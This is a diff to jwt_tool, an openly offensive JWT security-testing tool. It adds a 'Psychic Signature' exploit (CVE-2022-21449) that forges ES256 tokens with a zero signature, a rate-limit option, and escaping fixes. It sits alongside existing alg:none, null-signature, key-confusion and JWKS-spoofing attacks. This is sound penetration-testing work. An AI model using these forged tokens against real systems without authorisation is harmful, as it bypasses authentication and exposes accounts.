@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 #
-# JWT_Tool version 2.2.7 (28_05_2024)
+# JWT_Tool version 2.3.0 (01_05_2025)
 # Written by Andy Tyler (@ticarpi)
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
 # Web: https://www.ticarpi.com
 # Twitter: @ticarpi
 
-jwttoolvers = "2.2.7"
+jwttoolvers = "2.3.0"
 import ssl
 import sys
 import os
@@ -23,6 +23,8 @@ from datetime import datetime
 import configparser
 from http.cookies import SimpleCookie
 from collections import OrderedDict
+from ratelimit import limits, RateLimitException, sleep_and_retry
+
 try:
     from Cryptodome.Signature import PKCS1_v1_5, DSS, pss
     from Cryptodome.Hash import SHA256, SHA384, SHA512
@@ -51,6 +53,10 @@ except:
 # To fix broken colours in Windows cmd/Powershell: uncomment the below two lines. You will need to install colorama: 'python3 -m pip install colorama'
 # import colorama
 # colorama.init()
+
+# CONSTANTS
+DEFAULT_RATE_LIMIT  = 999999999
+DEFAULT_RATE_PERIOD = 60
 
 def cprintc(textval, colval):
     if not args.bare:
@@ -113,6 +119,7 @@ def createConfig():
     config['argvals'] = {'# Set at runtime - changes here are ignored': None,
         'sigType': '',
         'targetUrl': '',
+        'rate': str(DEFAULT_RATE_LIMIT),
         'cookies': '',
         'key': '',
         'keyList': '',
@@ -137,6 +144,9 @@ def createConfig():
     cprintc("Make sure to set the \"httplistener\" value to a URL you can monitor to enable out-of-band checks.", "cyan")
     exit(1)
 
+
+@sleep_and_retry
+@limits(calls=DEFAULT_RATE_LIMIT, period=DEFAULT_RATE_PERIOD)
 def sendToken(token, cookiedict, track, headertoken="", postdata=None):
     if not postdata:
         postdata = config['argvals']['postData']
@@ -166,7 +176,7 @@ def sendToken(token, cookiedict, track, headertoken="", postdata=None):
             cprintc("HTTP response took about 10 seconds or more - could be a sign of a bug or vulnerability", "cyan")
         return [response.status_code, len(response.content), response.content]
     except requests.exceptions.ProxyError as err:
-        cprintc("[ERROR] ProxyError - check proxy is up and not set to tamper with requests\n"+str(err), "red")
+        cprintc("[ERROR] ProxyError - check proxy is up and not set to tamper with requests\n(If proxy is not needed disable this with -np on the commandline.)\n"+str(err), "red")
         exit(1)
 
 def parse_dict_cookies(value):
@@ -286,6 +296,11 @@ def buildHead(alg, headDict):
 def checkNullSig(contents):
     jwtNull = contents.decode()+"."
     return jwtNull
+
+def checkPsySig(headDict, paylB64):
+    newHead = buildHead('ES256', headDict)
+    jwtPsy = newHead+"."+paylB64+".MAYCAQACAQA"
+    return jwtPsy
 
 def checkAlgNone(headDict, paylB64):
     alg1 = "none"
@@ -778,6 +793,10 @@ def jwksEmbed(newheadDict, newpaylDict):
     newjwks = buildJWKS(n, e, config['customising']['jwks_kid'])
     newHead["jwk"] = newjwks
     newHead["alg"] = "RS256"
+
+    if "kid" in newHead:
+        newHead["kid"] = "jwt_tool"
+
     key = privKey
     # key = RSA.importKey(privKey)
     newContents = genContents(newHead, newpaylDict)
@@ -1377,10 +1396,10 @@ def scanModePlaybook():
     cprintc("\nLAUNCHING SCAN: JWT Attack Playbook", "magenta")
     origalg = headDict["alg"]
     # No token
-    tmpCookies = config['argvals']['cookies']
+    tmpCookies = config['argvals']['cookies'].replace('%', '%%')
     tmpHeader = config['argvals']['header']
     if config['argvals']['headerloc'] == "cookies":
-        config['argvals']['cookies'] = strip_dict_cookies(config['argvals']['cookies'])
+        config['argvals']['cookies'] = strip_dict_cookies(config['argvals']['cookies'].replace('%', '%%'))
     elif config['argvals']['headerloc'] == "headers":
         config['argvals']['header'] = ""
     config['argvals']['overridesub'] = "true"
@@ -1404,6 +1423,9 @@ def scanModePlaybook():
     newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
     jwtBlankPw = newContents+"."+newSig
     jwtOut(jwtBlankPw, "Exploit: Blank password accepted in signature (-X b)", "This token can exploit a hard-coded blank password in the config")
+    # Exploit: Psychic Signature for ECDSA (CVE-2022-21449)
+    psySig = checkPsySig(headDict, paylB64)
+    jwtOut(psySig, "Exploit: 'Psychic Signature' accepted in ECDSA signing (-X p)", "Testing if the ECDSA signing process can be fooled (CVE-2022-21449)")
     # Exploit: null signature
     jwtNull = checkNullSig(contents)
     jwtOut(jwtNull, "Exploit: Null signature (-X n)", "This token was sent to check if a null signature can bypass checks")
@@ -1727,6 +1749,10 @@ def runExploits():
             jwtNull = checkNullSig(contents)
             desc = "EXPLOIT: null signature\n(This will only be valid on unpatched implementations of JWT.)"
             jwtOut(jwtNull, "Exploit: Null signature", desc)
+        elif args.exploit == "p":
+            jwtPsy = checkPsySig(headDict, paylB64)
+            desc = "EXPLOIT: Psychic Signature (CVE-2022-21449)\n(This will only be valid on unpatched implementations of JWT.)"
+            jwtOut(jwtPsy, "Exploit: Psychic Signature (CVE-2022-21449)", desc)
         elif args.exploit == "b":
             key = ""
             newSig, newContents = signTokenHS(headDict, paylDict, key, 256)
@@ -1831,6 +1857,8 @@ if __name__ == '__main__':
                         help="URL to send HTTP request to with new JWT")
     parser.add_argument("-r", "--request", action="store",
                         help="URL request to base on")
+    parser.add_argument("-rt", "--rate", action="store",
+                        help="Max. number of requests per minute")
     parser.add_argument("-i", "--insecure", action="store_true",
                         help="Use HTTP for passed request")
     parser.add_argument("-rc", "--cookies", action="store",
@@ -1848,11 +1876,11 @@ if __name__ == '__main__':
     parser.add_argument("-M", "--mode", action="store",
                         help="Scanning mode:\npb = playbook audit\ner = fuzz existing claims to force errors\ncc = fuzz common claims\nat - All Tests!")
     parser.add_argument("-X", "--exploit", action="store",
-                        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
+                        help="eXploit known vulnerabilities:\na = alg:none\nn = null signature\nb = blank password accepted in signature\np = 'psychic signature' accepted in ECDSA signing\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS")
     parser.add_argument("-ju", "--jwksurl", action="store",
                         help="URL location where you can host a spoofed JWKS")
     parser.add_argument("-S", "--sign", action="store",
-                        help="sign the resulting token:\nhs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)\nrs256/rs384/hs512 = RSA signing (specify an RSA private key with -pr)\nes256/es384/es512 = Elliptic Curve signing (specify an EC private key with -pr)\nps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)")
+                        help="sign the resulting token:\nhs256/hs384/hs512 = HMAC-SHA signing (specify a secret with -k/-p)\nrs256/rs384/rs512 = RSA signing (specify an RSA private key with -pr)\nes256/es384/es512 = Elliptic Curve signing (specify an EC private key with -pr)\nps256/ps384/ps512 = PSS-RSA signing (specify an RSA private key with -pr)")
     parser.add_argument("-pr", "--privkey", action="store",
                         help="Private Key for Asymmetric crypto")
     parser.add_argument("-T", "--tamper", action="store_true",
@@ -1903,6 +1931,7 @@ if __name__ == '__main__':
     config = configparser.ConfigParser()
     if (os.path.isfile(configFileName)):
         config.read(configFileName)
+        print(configFileName)
     else:
         cprintc("No config file yet created.\nRunning config setup.", "cyan")
         createConfig()
@@ -1971,6 +2000,25 @@ if __name__ == '__main__':
         absolute_url = urljoin(base_url + (':' + port if port else ''), url)
         args.targeturl = absolute_url
 
+    if args.rate:
+        try:
+            if int(args.rate) > 0:
+                rate = int(args.rate)
+                # Reassign decorator with new rate limit value
+                sendToken = sleep_and_retry(limits(calls=rate, period=DEFAULT_RATE_PERIOD)(sendToken))
+                # Display appropriate log
+                RPS = rate/DEFAULT_RATE_PERIOD
+                if RPS < 1:
+                    cprintc("[+] RATE-LIMIT: Running at "+ str((rate/DEFAULT_RATE_PERIOD)*60) + " requests per minute\n", "cyan")
+                else:
+                    cprintc("[+] RATE-LIMIT: Running at "+ str((rate/DEFAULT_RATE_PERIOD)) + " requests per second\n", "cyan")
+                    
+            else:
+                cprintc("Rate must be an integer > 0", "red")
+                exit(1)
+        except:
+            cprintc("Error: could not handle rate argument", "red")
+            exit(1)
     if args.targeturl:
         if args.cookies or args.headers or args.postdata:
             jwt_count = 0
@@ -2048,9 +2096,9 @@ if __name__ == '__main__':
         else:
             config['argvals']['scanMode'] = args.mode
     if args.exploit:
-        if args.exploit not in ['a', 'n', 'b', 's', 'i', 'k']:
+        if args.exploit not in ['a', 'n', 'b', 's', 'i', 'k', 'p']:
             parser.print_usage()
-            cprintc("\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\nb = blank password accepted in signature\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
+            cprintc("\nPlease choose an exploit (e.g. -X a):\na = alg:none\nn = null signature\nb = blank password accepted in signature\np = 'psychic signature' accepted in ECDSA signing\ns = spoof JWKS (specify JWKS URL with -ju, or set in jwtconf.ini to automate this attack)\nk = key confusion (specify public key with -pk)\ni = inject inline JWKS", "red")
             exit(1)
         else:
             config['argvals']['exploitType'] = args.exploit
@@ -2067,7 +2115,7 @@ if __name__ == '__main__':
     if args.targeturl:
         config['argvals']['targetUrl'] = args.targeturl.replace('%','%%')
     if args.cookies:
-        config['argvals']['cookies'] = args.cookies
+        config['argvals']['cookies'] = args.cookies.replace('%', '%%')
     if args.headers:
         config['argvals']['header'] = str(args.headers)
     if args.dict:
@@ -2093,7 +2141,7 @@ if __name__ == '__main__':
     if args.headervalue:
         config['argvals']['headervalue'] = str(args.headervalue)
     if args.postdata:
-        config['argvals']['postData'] = args.postdata
+        config['argvals']['postData'] = args.postdata.replace('%', '%%')
     if args.canaryvalue:
         config['argvals']['canaryvalue'] = args.canaryvalue
     if args.noproxy:
@@ -2102,6 +2150,7 @@ if __name__ == '__main__':
         config['services']['redir'] = "False"
     if args.request:
         config['argvals']['request'] = args.request
+    
 
     if not args.crack and not args.exploit and not args.verify and not args.tamper and not args.injectclaims:
         rejigToken(headDict, paylDict, sig)
